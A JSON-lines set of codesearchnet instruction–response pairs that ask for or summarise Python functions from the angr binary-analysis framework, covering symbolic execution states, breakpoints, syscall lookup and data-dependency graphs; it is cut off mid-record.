{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if the id is already in the vault.", "response": "def is_stored(self, i):\n        \"\"\"\n        Checks if the provided id is already in the vault.\n        \"\"\"\n        if i in self.stored:\n            return True\n\n        try:\n            with self._read_context(i):\n                return True\n        except (AngrVaultError, EOFError):\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef load(self, id): #pylint:disable=redefined-builtin\n        l.debug(\"LOAD: %s\", id)\n        try:\n            l.debug(\"... trying cached\")\n            return self._object_cache[id]\n        except KeyError:\n            l.debug(\"... cached failed\")\n            with self._read_context(id) as u:\n                return VaultUnpickler(self, u).load()", "response": "Load one object from the pickler with the provided ID."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef store(self, o, id=None): #pylint:disable=redefined-builtin\n        actual_id = id or self._get_persistent_id(o) or \"TMP-\"+str(uuid.uuid4())\n\n        l.debug(\"STORE: %s %s\", o, actual_id)\n\n        # this handles recursive objects\n        if actual_id in self.storing:\n            return actual_id\n\n        if self.is_stored(actual_id):\n            l.debug(\"... already stored\")\n            return actual_id\n\n        with self._write_context(actual_id) as output:\n            self.storing.add(actual_id)\n            VaultPickler(self, output, assigned_objects=(o,)).dump(o)\n            self.stored.add(actual_id)\n\n        return actual_id", "response": "Stores an object and returns its ID."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a serialized string representing the object", "response": "def dumps(self, o):\n        \"\"\"\n        Returns a serialized string representing the object, post-deduplication.\n\n        :param o: the object\n        \"\"\"\n        f = io.BytesIO()\n        VaultPickler(self, f).dump(o)\n        f.seek(0)\n        return f.read()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef loads(self, s):\n        f = io.BytesIO(s)\n        return VaultUnpickler(self, f).load()", "response": "Deserializes a string representation of the object."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntry to find the name of a register in the arch. bytes.", "response": "def get_reg_name(arch, reg_offset):\n        \"\"\"\n        :param arch: the architecture\n        :param reg_offset: Tries to find the name of a register given the offset in the registers.\n        :return: The register name\n        \"\"\"\n        # todo does this make sense\n        if reg_offset is None:\n            return None\n\n        original_offset = reg_offset\n        while reg_offset >= 0 and reg_offset >= original_offset - (arch.bytes):\n            if reg_offset in arch.register_names:\n                return arch.register_names[reg_offset]\n            else:\n                reg_offset -= 1\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting an input state into a state with symbolic registers", "response": "def _make_regs_symbolic(input_state, reg_list, project):\n        \"\"\"\n        converts an input state into a state with symbolic registers\n        :return: the symbolic state\n        \"\"\"\n        state = input_state.copy()\n        # overwrite all registers\n        for reg in reg_list:\n            state.registers.store(reg, state.solver.BVS(\"sreg_\" + reg + \"-\", project.arch.bits, explicit_name=True))\n        # restore sp\n        state.regs.sp = input_state.regs.sp\n        # restore bp\n        state.regs.bp = input_state.regs.bp\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef make_initial_state(project, stack_length):\n        initial_state = project.factory.blank_state(\n            add_options={options.AVOID_MULTIVALUED_READS, options.AVOID_MULTIVALUED_WRITES,\n                         options.NO_SYMBOLIC_JUMP_RESOLUTION, options.CGC_NO_SYMBOLIC_RECEIVE_LENGTH,\n                         options.NO_SYMBOLIC_SYSCALL_RESOLUTION, options.TRACK_ACTION_HISTORY},\n            remove_options=options.resilience | options.simplification)\n        initial_state.options.discard(options.CGC_ZERO_FILL_UNCONSTRAINED_MEMORY)\n        initial_state.options.update({options.TRACK_REGISTER_ACTIONS, options.TRACK_MEMORY_ACTIONS,\n                                      options.TRACK_JMP_ACTIONS, options.TRACK_CONSTRAINT_ACTIONS})\n        symbolic_stack = initial_state.solver.BVS(\"symbolic_stack\", project.arch.bits * stack_length)\n        initial_state.memory.store(initial_state.regs.sp, symbolic_stack)\n        if initial_state.arch.bp_offset != initial_state.arch.sp_offset:\n            initial_state.regs.bp = initial_state.regs.sp + 20 * initial_state.arch.bytes\n        initial_state.solver._solver.timeout = 500  # only solve for half a second at most\n        return initial_state", "response": "Creates an initial state with a symbolic stack and good options for rop\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef make_symbolic_state(project, reg_list, stack_length=80):\n        input_state = Identifier.make_initial_state(project, stack_length)\n        symbolic_state = input_state.copy()\n        # overwrite all registers\n        for reg in reg_list:\n            symbolic_state.registers.store(reg, symbolic_state.solver.BVS(\"sreg_\" + reg + \"-\", project.arch.bits))\n        # restore sp\n        symbolic_state.regs.sp = input_state.regs.sp\n        # restore bp\n        symbolic_state.regs.bp = input_state.regs.bp\n        return symbolic_state", "response": "Converts an input state into a state with symbolic registers\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_state_options(self, left_add_options=None, left_remove_options=None, right_add_options=None, right_remove_options=None):\n        s_right = self.project.factory.full_init_state(\n            add_options=right_add_options, remove_options=right_remove_options,\n            args=[],\n        )\n        s_left = self.project.factory.full_init_state(\n            add_options=left_add_options, remove_options=left_remove_options,\n            args=[],\n        )\n\n        return self.set_states(s_left, s_right)", "response": "Sets the state options of the current state."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_states(self, left_state, right_state):\n\n        simgr = self.project.factory.simulation_manager(right_state)\n        simgr.stash(to_stash='right')\n        simgr.active.append(left_state)\n        simgr.stash(to_stash='left')\n        simgr.stash(to_stash='stashed_left')\n        simgr.stash(to_stash='stashed_right')\n\n        return self.set_simgr(simgr)", "response": "Sets the states of the current tree to the given states."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nvalidates that a detected incongruency is not caused by translation backends having a different incongruency.", "response": "def _validate_incongruency(self):\n        \"\"\"\n        Checks that a detected incongruency is not caused by translation backends having a different\n        idea of what constitutes a basic block.\n        \"\"\"\n\n        ot = self._throw\n\n        try:\n            self._throw = False\n            l.debug(\"Validating incongruency.\")\n\n            if (\"UNICORN\" in self.simgr.right[0].options) ^ (\"UNICORN\" in self.simgr.left[0].options):\n                if \"UNICORN\" in self.simgr.right[0].options:\n                    unicorn_stash = 'right'\n                    normal_stash = 'left'\n                else:\n                    unicorn_stash = 'left'\n                    normal_stash = 'right'\n\n                unicorn_path = self.simgr.stashes[unicorn_stash][0]\n                normal_path = self.simgr.stashes[normal_stash][0]\n\n                if unicorn_path.arch.name in (\"X86\", \"AMD64\"):\n                    # unicorn \"falls behind\" on loop and rep instructions, since\n                    # it sees them as ending a basic block. Here, we will\n                    # step the unicorn until it's caught up\n                    npg = self.project.factory.simulation_manager(unicorn_path)\n                    npg.explore(find=lambda p: p.addr == normal_path.addr, n=200)\n                    if len(npg.found) == 0:\n                        l.debug(\"Validator failed to sync paths.\")\n                        return True\n\n                    new_unicorn = npg.found[0]\n                    delta = new_unicorn.history.block_count - normal_path.history.block_count\n                    normal_path.history.recent_block_count += delta\n                    new_normal = normal_path\n                elif unicorn_path.arch.name == \"MIPS32\":\n                    # unicorn gets ahead here, because VEX falls behind for unknown reasons\n                    # for example, this block:\n                    #\n                    # 0x1016f20:      lui     $gp, 0x17\n                    # 0x1016f24:      addiu   $gp, $gp, -0x35c0\n                    # 0x1016f28:      addu    $gp, $gp, $t9\n                    # 0x1016f2c:      addiu   $sp, $sp, -0x28\n                    # 0x1016f30:      sw      $ra, 0x24($sp)\n                    # 0x1016f34:      sw      $s0, 0x20($sp)\n                    # 0x1016f38:      sw      $gp, 0x10($sp)\n                    # 0x1016f3c:      lw      $v0, -0x6cf0($gp)\n                    # 0x1016f40:      move    $at, $at\n                    npg = self.project.factory.simulation_manager(normal_path)\n                    npg.explore(find=lambda p: p.addr == unicorn_path.addr, n=200)\n                    if len(npg.found) == 0:\n                        l.debug(\"Validator failed to sync paths.\")\n                        return True\n\n                    new_normal = npg.found[0]\n                    delta = new_normal.history.block_count - unicorn_path.history.block_count\n                    unicorn_path.history.recent_block_count += delta\n                    new_unicorn = unicorn_path\n                else:\n                    l.debug(\"Dunno!\")\n                    return True\n\n                if self.compare_paths(new_unicorn, new_normal):\n                    l.debug(\"Divergence accounted for by unicorn.\")\n                    self.simgr.stashes[unicorn_stash][0] = new_unicorn\n                    self.simgr.stashes[normal_stash][0] = new_normal\n                    return False\n                else:\n                    l.warning(\"Divergence unaccounted for by unicorn.\")\n                    return True\n            else:\n                # no idea\n                l.warning(\"Divergence unaccounted for.\")\n                return True\n        finally:\n            self._throw = ot"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking that the paths in the specified path group stay the same over the next `depth` bytes. The path group should have a \"left\" and a \"right\" stash, each with a single path.", "response": "def run(self, depth=None):\n        \"\"\"\n        Checks that the paths in the specified path group stay the same over the next\n        `depth` bytes.\n\n        The path group should have a \"left\" and a \"right\" stash, each with a single\n        path.\n        \"\"\"\n        #pg_history = [ ]\n        if len(self.simgr.right) != 1 or len(self.simgr.left) != 1:\n            self._report_incongruency(\"Single path in pg.left and pg.right required.\")\n            return False\n\n        if \"UNICORN\" in self.simgr.one_right.options and depth is not None:\n            self.simgr.one_right.unicorn.max_steps = depth\n\n        if \"UNICORN\" in self.simgr.one_left.options and depth is not None:\n            self.simgr.one_left.unicorn.max_steps = depth\n\n        l.debug(\"Performing initial path comparison.\")\n        if not self.compare_paths(self.simgr.left[0], self.simgr.right[0]):\n            self._report_incongruency(\"Initial path comparison check failed.\")\n            return False\n\n        while len(self.simgr.left) > 0 and len(self.simgr.right) > 0:\n            if depth is not None:\n                self._update_progress(100. * float(self.simgr.one_left.history.block_count) / depth)\n\n            if len(self.simgr.deadended) != 0:\n                self._report_incongruency(\"Unexpected deadended paths before step.\")\n                return False\n            if len(self.simgr.right) == 0 and len(self.simgr.left) == 0:\n                l.debug(\"All done!\")\n                return True\n            if len(self.simgr.right) != 1 or len(self.simgr.left) != 1:\n                self._report_incongruency(\"Different numbers of paths in left and right stash..\")\n                return False\n\n            # do a step\n            l.debug(\n                \"Stepping right path with weighted length %d/%d\",\n                self.simgr.right[0].history.block_count,\n                depth\n            )\n            self.prev_pg = self.simgr.copy() #pylint:disable=unused-variable\n            self.simgr.step(stash='right')\n            CongruencyCheck._sync_steps(self.simgr)\n\n            if len(self.simgr.errored) != 0:\n                self._report_incongruency(\"Unexpected errored paths.\")\n                return False\n\n            try:\n                if not self.compare_path_group(self.simgr) and self._validate_incongruency():\n                    self._report_incongruency(\"Path group comparison failed.\")\n                    return False\n            except AngrIncongruencyError:\n                if self._validate_incongruency():\n                    raise\n\n            if depth is not None:\n                self.simgr.drop(stash='left', filter_func=lambda p: p.history.block_count >= depth)\n                self.simgr.drop(stash='right', filter_func=lambda p: p.history.block_count >= depth)\n\n            self.simgr.right.sort(key=lambda p: p.addr)\n            self.simgr.left.sort(key=lambda p: p.addr)\n            self.simgr.stashed_right[:] = self.simgr.stashed_right[::-1]\n            self.simgr.stashed_left[:] = self.simgr.stashed_left[::-1]\n            self.simgr.move('stashed_right', 'right')\n            self.simgr.move('stashed_left', 'left')\n\n            if len(self.simgr.left) > 1:\n                self.simgr.split(from_stash='left', limit=1, to_stash='stashed_left')\n                self.simgr.split(from_stash='right', limit=1, to_stash='stashed_right')"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef compare_states(self, sl, sr):\n        joint_solver = claripy.Solver()\n\n        # make sure the canonicalized constraints are the same\n        n_map, n_counter, n_canon_constraint = claripy.And(*sr.solver.constraints).canonicalize() #pylint:disable=no-member\n        u_map, u_counter, u_canon_constraint = claripy.And(*sl.solver.constraints).canonicalize() #pylint:disable=no-member\n        n_canoner_constraint = sr.solver.simplify(n_canon_constraint)\n        u_canoner_constraint = sl.solver.simplify(u_canon_constraint)\n        joint_solver.add((n_canoner_constraint, u_canoner_constraint))\n        if n_canoner_constraint is not u_canoner_constraint:\n            self._report_incongruency(\"Different constraints!\")\n            return False\n\n        # get the differences in registers and memory\n        mem_diff = sr.memory.changed_bytes(sl.memory)\n        reg_diff = sr.registers.changed_bytes(sl.registers)\n\n        # this is only for unicorn\n        if \"UNICORN\" in sl.options or \"UNICORN\" in sr.options:\n            if sl.arch.name == \"X86\":\n                reg_diff -= set(range(40, 52)) #ignore cc psuedoregisters\n                reg_diff -= set(range(320, 324)) #some other VEX weirdness\n                reg_diff -= set(range(340, 344)) #ip_at_syscall\n            elif sl.arch.name == \"AMD64\":\n                reg_diff -= set(range(144, 168)) #ignore cc psuedoregisters\n\n        # make sure the differences in registers and memory are actually just renamed\n        # versions of the same ASTs\n        for diffs,(um,nm) in (\n            (reg_diff, (sl.registers, sr.registers)),\n            (mem_diff, (sl.memory, sr.memory)),\n        ):\n            for i in diffs:\n                bn = nm.load(i, 1)\n                bu = um.load(i, 1)\n\n                bnc = bn.canonicalize(var_map=n_map, counter=n_counter)[-1]\n                buc = bu.canonicalize(var_map=u_map, counter=u_counter)[-1]\n\n                if bnc is not buc:\n                    self._report_incongruency(\"Different memory or registers (index %d, values %r and %r)!\", i, bn, bu)\n                    return False\n\n        # make sure the flags are the same\n        if sl.arch.name in (\"AMD64\", \"X86\", \"ARM\", \"ARMEL\", \"ARMHF\", \"AARCH64\"):\n            # pylint: disable=unused-variable\n            n_bkp = sr.regs.cc_op, sr.regs.cc_dep1, sr.regs.cc_dep2, sr.regs.cc_ndep\n            u_bkp = sl.regs.cc_op, sl.regs.cc_dep1, sl.regs.cc_dep2, sl.regs.cc_ndep\n            if sl.arch.name in ('AMD64', 'X86'):\n                n_flags = sr.regs.eflags.canonicalize(var_map=n_map, counter=n_counter)[-1]\n                u_flags = sl.regs.eflags.canonicalize(var_map=u_map, counter=u_counter)[-1]\n            else:\n                n_flags = sr.regs.flags.canonicalize(var_map=n_map, counter=n_counter)[-1]\n                u_flags = sl.regs.flags.canonicalize(var_map=u_map, counter=u_counter)[-1]\n            if n_flags is not u_flags and sl.solver.simplify(n_flags) is not sr.solver.simplify(u_flags):\n                self._report_incongruency(\"Different flags!\")\n                return False\n\n        return True", "response": "Compares two states for similarity."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check(self, state, when):\n        ok = self.enabled and (when == self.when or self.when == BP_BOTH)\n        if not ok:\n            return ok\n        l.debug(\"... after enabled and when: %s\", ok)\n\n        for a in [ _ for _ in self.kwargs if not _.endswith(\"_unique\") ]:\n            current_expr = getattr(state.inspect, a)\n            needed = self.kwargs.get(a, None)\n\n            l.debug(\"... checking condition %s\", a)\n\n            if current_expr is None and needed is None:\n                l.debug(\"...... both None, True\")\n                c_ok = True\n            elif current_expr is not None and needed is not None:\n                if state.solver.solution(current_expr, needed):\n                    l.debug(\"...... is_solution!\")\n                    c_ok = True\n                else:\n                    l.debug(\"...... not solution...\")\n                    c_ok = False\n\n                if c_ok and self.kwargs.get(a+'_unique', True):\n                    l.debug(\"...... checking uniqueness\")\n                    if not state.solver.unique(current_expr):\n                        l.debug(\"...... not unique\")\n                        c_ok = False\n            else:\n                l.debug(\"...... one None, False\")\n                c_ok = False\n\n            ok = ok and c_ok\n            if not ok:\n                return ok\n            l.debug(\"... after condition %s: %s\", a, ok)\n\n        ok = ok and (self.condition is None or self.condition(state))\n        l.debug(\"... after condition func: %s\", ok)\n        return ok", "response": "Checks state to see if the breakpoint should fire."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ntrigger the breakpoint. :param state: The state.", "response": "def fire(self, state):\n        \"\"\"\n        Trigger the breakpoint.\n\n        :param state:   The state.\n        \"\"\"\n        if self.action is None or self.action == BP_IPDB:\n            import ipdb; ipdb.set_trace() #pylint:disable=F0401\n        elif self.action == BP_IPYTHON:\n            import IPython\n            shell = IPython.terminal.embed.InteractiveShellEmbed()\n            shell.mainloop(display_banner=\"This is an ipython shell for you to happily debug your state!\\n\" + \\\n                           \"The state can be accessed through the variable 'state'. You can\\n\" +\\\n                           \"make modifications, then exit this shell to resume your analysis.\")\n        else:\n            self.action(state)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef action(self, event_type, when, **kwargs):\n        l.debug(\"Event %s (%s) firing...\", event_type, when)\n        for k,v in kwargs.items():\n            if k not in inspect_attributes:\n                raise ValueError(\"Invalid inspect attribute %s passed in. Should be one of: %s\" % (k, inspect_attributes))\n            #l.debug(\"... %s = %r\", k, v)\n            l.debug(\"... setting %s\", k)\n            setattr(self, k, v)\n\n        for bp in self._breakpoints[event_type]:\n            l.debug(\"... checking bp %r\", bp)\n            if bp.check(self.state, when):\n                l.debug(\"... FIRE\")\n                bp.fire(self.state)", "response": "Called from within SimuVEX when events happen."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating and adds a breakpoint which would trigger on event_type. Additional arguments are passed to the BP constructor.", "response": "def make_breakpoint(self, event_type, *args, **kwargs):\n        \"\"\"\n        Creates and adds a breakpoint which would trigger on `event_type`. Additional arguments are passed to the\n        :class:`BP` constructor.\n\n        :return:    The created breakpoint, so that it can be removed later.\n        \"\"\"\n        bp = BP(*args, **kwargs)\n        self.add_breakpoint(event_type, bp)\n        return bp"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_breakpoint(self, event_type, bp):\n        if event_type not in event_types:\n            raise ValueError(\"Invalid event type %s passed in. Should be one of: %s\" % (event_type,\n                                                                                        \", \".join(event_types))\n                             )\n        self._breakpoints[event_type].append(bp)", "response": "Adds a breakpoint which would trigger on event_type."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nremove a breakpoint from the cache.", "response": "def remove_breakpoint(self, event_type, bp=None, filter_func=None):\n        \"\"\"\n        Removes a breakpoint.\n\n        :param bp:  The breakpoint to remove.\n        :param filter_func: A filter function to specify whether each breakpoint should be removed or not.\n        \"\"\"\n\n        if bp is None and filter_func is None:\n            raise ValueError('remove_breakpoint(): You must specify either \"bp\" or \"filter\".')\n\n        try:\n            if bp is not None:\n                self._breakpoints[event_type].remove(bp)\n            else:\n                self._breakpoints[event_type] = [ b for b in self._breakpoints[event_type] if not filter_func(b) ]\n        except ValueError:\n            # the breakpoint is not found\n            l.error('remove_breakpoint(): Breakpoint %s (type %s) is not found.', bp, event_type)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves previously stored attributes from this plugin instance to save memory.", "response": "def downsize(self):\n        \"\"\"\n        Remove previously stored attributes from this plugin instance to save memory.\n        This method is supposed to be called by breakpoint implementors. A typical workflow looks like the following :\n\n        >>> # Add `attr0` and `attr1` to `self.state.inspect`\n        >>> self.state.inspect(xxxxxx, attr0=yyyy, attr1=zzzz)\n        >>> # Get new attributes out of SimInspect in case they are modified by the user\n        >>> new_attr0 = self.state._inspect.attr0\n        >>> new_attr1 = self.state._inspect.attr1\n        >>> # Remove them from SimInspect\n        >>> self.state._inspect.downsize()\n        \"\"\"\n        for k in inspect_attributes:\n            if hasattr(self, k):\n                setattr(self, k, None)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngives a state return the corresponding syscall.", "response": "def syscall(self, state, allow_unsupported=True):\n        \"\"\"\n        Given a state, return the procedure corresponding to the current syscall.\n        This procedure will have .syscall_number, .display_name, and .addr set.\n\n        :param state:               The state to get the syscall number from\n        :param allow_unsupported:   Whether to return a \"dummy\" sycall instead of raising an unsupported exception\n        \"\"\"\n        abi = self.syscall_abi(state)\n\n        if state.os_name in SYSCALL_CC[state.arch.name]:\n            cc = SYSCALL_CC[state.arch.name][state.os_name](state.arch)\n        else:\n            # Use the default syscall calling convention - it may bring problems\n            _l.warning(\"No syscall calling convention available for %s/%s\", state.arch.name, state.os_name)\n            cc = SYSCALL_CC[state.arch.name]['default'](state.arch)\n\n        sym_num = cc.syscall_num(state)\n        try:\n            num = state.solver.eval_one(sym_num)\n        except SimSolverError:\n            if allow_unsupported:\n                num = self.unknown_syscall_number\n            else:\n                if not state.solver.satisfiable():\n                    raise AngrUnsupportedSyscallError(\"The program state is not satisfiable\")\n                else:\n                    raise AngrUnsupportedSyscallError(\"Got a symbolic syscall number\")\n\n        proc = self.syscall_from_number(num, allow_unsupported=allow_unsupported, abi=abi)\n        proc.cc = cc\n        return proc"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_syscall_addr(self, addr):\n        if self.kernel_base is None or addr < self.kernel_base:\n            return False\n\n        addr -= self.kernel_base\n\n        if addr % self.syscall_addr_alignment != 0:\n            return False\n\n        addr //= self.syscall_addr_alignment\n        return addr <= self.unknown_syscall_number", "response": "Return whether or not the given address corresponds to a syscall implementation."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting a syscall SimProcedure from an address.", "response": "def syscall_from_addr(self, addr, allow_unsupported=True):\n        \"\"\"\n        Get a syscall SimProcedure from an address.\n\n        :param addr: The address to convert to a syscall SimProcedure\n        :param allow_unsupported: Whether to return a dummy procedure for an unsupported syscall instead of raising an\n                                  exception.\n        :return: The SimProcedure for the syscall, or None if the address is not a syscall address.\n        \"\"\"\n        if not self.is_syscall_addr(addr):\n            return None\n\n        number = (addr - self.kernel_base) // self.syscall_addr_alignment\n        for abi in self.syscall_abis:\n            baseno, minno, maxno = self.syscall_abis[abi]\n            if baseno <= number <= baseno + maxno - minno:\n                number += minno\n                number -= baseno\n                break\n        else:\n            abi = None\n        return self.syscall_from_number(number, allow_unsupported=allow_unsupported, abi=abi)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef syscall_from_number(self, number, allow_unsupported=True, abi=None):\n        abilist = self.syscall_abis if abi is None else [abi]\n\n        if self.syscall_library is None:\n            if not allow_unsupported:\n                raise AngrUnsupportedSyscallError(\"%s does not have a library of syscalls implemented\" % self.name)\n            proc = P['stubs']['syscall']()\n        elif not allow_unsupported and not self.syscall_library.has_implementation(number, self.arch, abilist):\n            raise AngrUnsupportedSyscallError(\"No implementation for syscall %d\" % number)\n        else:\n            proc = self.syscall_library.get(number, self.arch, abilist)\n\n        if proc.abi is not None:\n            baseno, minno, _ = self.syscall_abis[proc.abi]\n            mapno = number - minno + baseno\n        else:\n            mapno = self.unknown_syscall_number\n\n        proc.addr = mapno * self.syscall_addr_alignment + self.kernel_base\n        return proc", "response": "Get a SimProcedure from its number."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef convert_prot(prot):\n    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx\n    if prot & 0x10:\n        return 4\n    if prot & 0x20:\n        return 5\n    if prot & 0x40:\n        return 7\n    if prot & 0x80:\n        return 7\n    if prot & 0x01:\n        return 0\n    if prot & 0x02:\n        return 1\n    if prot & 0x04:\n        return 3\n    if prot & 0x08:\n        return 3\n    raise angr.errors.SimValueError(\"Unknown windows memory protection constant: %#x\" % prot)", "response": "Convert a windows memory protection constant to an angr bitmask."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef copy(self):\n\n        ld = LiveDefinitions()\n        ld._memory_map = self._memory_map.copy()\n        ld._register_map = self._register_map.copy()\n        ld._defs = self._defs.copy()\n\n        return ld", "response": "Make a hard copy of self."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding a new definition of variable at location.", "response": "def add_def(self, variable, location, size_threshold=32):\n        \"\"\"\n        Add a new definition of variable.\n\n        :param SimVariable variable: The variable being defined.\n        :param CodeLocation location: Location of the varaible being defined.\n        :param int size_threshold: The maximum bytes to consider for the variable.\n        :return: True if the definition was new, False otherwise\n        :rtype: bool\n        \"\"\"\n\n        new_defs_added = False\n\n        if isinstance(variable, SimRegisterVariable):\n            if variable.reg is None:\n                l.warning('add_def: Got a None for a SimRegisterVariable. Consider fixing.')\n                return new_defs_added\n\n            size = min(variable.size, size_threshold)\n            offset = variable.reg\n            while offset < variable.reg + size:\n                if location not in self._register_map[offset]:\n                    new_defs_added = True\n                self._register_map[offset].add(location)\n                offset += 1\n\n            self._defs[variable].add(location)\n\n        elif isinstance(variable, SimMemoryVariable):\n            size = min(variable.size, size_threshold)\n            offset = variable.addr\n            while offset < variable.addr + size:\n                if location not in self._memory_map[offset]:\n                    new_defs_added = True\n                self._memory_map[offset].add(location)\n                offset += 1\n\n            self._defs[variable].add(location)\n\n        else:\n            l.error('Unsupported variable type \"%s\".', type(variable))\n\n        return new_defs_added"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd a collection of new definitions of a variable.", "response": "def add_defs(self, variable, locations, size_threshold=32):\n        \"\"\"\n        Add a collection of new definitions of a variable.\n\n        :param SimVariable variable: The variable being defined.\n        :param iterable locations: A collection of locations where the variable was defined.\n        :param int size_threshold: The maximum bytes to consider for the variable.\n        :return: True if any of the definition was new, False otherwise\n        :rtype: bool\n        \"\"\"\n\n        new_defs_added = False\n\n        for loc in locations:\n            new_defs_added |= self.add_def(variable, loc, size_threshold=size_threshold)\n\n        return new_defs_added"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef kill_def(self, variable, location, size_threshold=32):\n\n        if isinstance(variable, SimRegisterVariable):\n            if variable.reg is None:\n                l.warning('kill_def: Got a None for a SimRegisterVariable. Consider fixing.')\n                return None\n\n            size = min(variable.size, size_threshold)\n            offset = variable.reg\n            while offset < variable.reg + size:\n                self._register_map[offset] = { location }\n                offset += 1\n\n            self._defs[variable] = { location }\n\n        elif isinstance(variable, SimMemoryVariable):\n            size = min(variable.size, size_threshold)\n            offset = variable.addr\n            while offset < variable.addr + size:\n                self._memory_map[offset] = { location }\n                offset += 1\n\n            self._defs[variable] = { location }\n\n        else:\n            l.error('Unsupported variable type \"%s\".', type(variable))", "response": "Add a new definition for variable and kill all previous definitions."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a set of code locations where the variable is defined.", "response": "def lookup_defs(self, variable, size_threshold=32):\n        \"\"\"\n        Find all definitions of the varaible\n\n        :param SimVariable variable: The variable to lookup for.\n        :param int size_threshold: The maximum bytes to consider for the variable. For example, if the variable is 100\n                                   byte long, only the first `size_threshold` bytes are considered.\n        :return: A set of code locations where the variable is defined.\n        :rtype: set\n        \"\"\"\n\n        live_def_locs = set()\n\n        if isinstance(variable, SimRegisterVariable):\n\n            if variable.reg is None:\n                l.warning('lookup_defs: Got a None for a SimRegisterVariable. Consider fixing.')\n                return live_def_locs\n\n            size = min(variable.size, size_threshold)\n            offset = variable.reg\n            while offset < variable.reg + size:\n                if offset in self._register_map:\n                    live_def_locs |= self._register_map[offset]\n                offset += 1\n\n        elif isinstance(variable, SimMemoryVariable):\n            size = min(variable.size, size_threshold)\n            offset = variable.addr\n            while offset < variable.addr + size:\n                if offset in self._memory_map:\n                    live_def_locs |= self._memory_map[offset]\n                offset += 1\n\n        else:\n            # umm unsupported variable type\n            l.error('Unsupported variable type \"%s\".', type(variable))\n\n        return live_def_locs"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts a ProgramVariable instance to a DDGViewItem object.", "response": "def _to_viewitem(self, prog_var):\n        \"\"\"\n        Convert a ProgramVariable instance to a DDGViewItem object.\n\n        :param ProgramVariable prog_var: The ProgramVariable object to convert.\n        :return:                         The converted DDGViewItem object.\n        :rtype:                          DDGViewItem\n        \"\"\"\n\n        return DDGViewItem(self._ddg, prog_var, simplified=self._simplified)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of ProgramVariable instances that are located at the current instruction address.", "response": "def definitions(self):\n        \"\"\"\n        Get all definitions located at the current instruction address.\n\n        :return: A list of ProgramVariable instances.\n        :rtype:  list\n        \"\"\"\n\n        defs = set()\n\n        if self._simplified:\n            graph = self._ddg.simplified_data_graph\n        else:\n            graph = self._ddg.data_graph\n\n        for n in graph.nodes():  # type: ProgramVariable\n            if n.location.ins_addr == self._insn_addr:\n                defs.add(DDGViewItem(self._ddg, n, simplified=self._simplified))\n\n        return list(defs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a dependency graph for the function func.", "response": "def function_dependency_graph(self, func):\n        \"\"\"\n        Get a dependency graph for the function `func`.\n\n        :param func:    The Function object in CFG.function_manager.\n        :returns:       A networkx.DiGraph instance.\n        \"\"\"\n\n        if self._function_data_dependencies is None:\n            self._build_function_dependency_graphs()\n\n        if func in self._function_data_dependencies:\n            return self._function_data_dependencies[func]\n\n        # Not found\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget a subgraph of the data graph that starts from a given node pv.", "response": "def data_sub_graph(self, pv, simplified=True, killing_edges=False, excluding_types=None):\n        \"\"\"\n        Get a subgraph from the data graph or the simplified data graph that starts from node pv.\n\n        :param ProgramVariable pv: The starting point of the subgraph.\n        :param bool simplified: When True, the simplified data graph is used, otherwise the data graph is used.\n        :param bool killing_edges: Are killing edges included or not.\n        :param iterable excluding_types: Excluding edges whose types are among those excluded types.\n        :return: A subgraph.\n        :rtype: networkx.MultiDiGraph\n        \"\"\"\n\n        result = networkx.MultiDiGraph()\n        result.add_node(pv)\n\n        base_graph = self.simplified_data_graph if simplified else self.data_graph\n        if pv not in base_graph:\n            return result\n\n        # traverse all edges and add them to the result graph if needed\n        queue = [ pv ]\n        traversed = set()\n        while queue:\n            elem = queue[0]\n            queue = queue[1:]\n            if elem in traversed:\n                continue\n            traversed.add(elem)\n\n            out_edges = base_graph.out_edges(elem, data=True)\n\n            if not killing_edges:\n                # remove killing edges\n                out_edges = [ (a, b, data) for a, 